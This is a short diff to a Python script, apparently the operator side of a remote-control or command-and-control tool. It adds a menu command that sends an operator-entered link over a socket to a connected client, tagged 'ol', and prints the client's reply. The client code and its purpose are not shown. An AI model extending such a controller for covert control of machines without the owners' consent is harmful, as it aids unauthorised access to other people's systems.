@@ -131,6 +131,18 @@ def commandHQ():
                 ans = True
             except:
                 reload()
+                
+        if command == "5":
+            try:
+                link = input(format + "Enter link: ")
+                
+                message = str(["ol", link])
+                message = message.encode()
+                
+                conn.send(message)
+                ans = True
+            except:
+                reload()
 
 
         if(ans == False): commandHQ()
@@ -151,6 +163,9 @@ def commandHQ():
                 print(format + "Data received: {}".format(incoming_message[1]))
                 
             if incoming_message[0] == "rtf": # 4
+                print(format + "Data received: {}".format(incoming_message[1]))
+                
+            if incoming_message[0] == "ol": # 5
                 print(format + "Data received: {}".format(incoming_message[1]))
 
 clear()
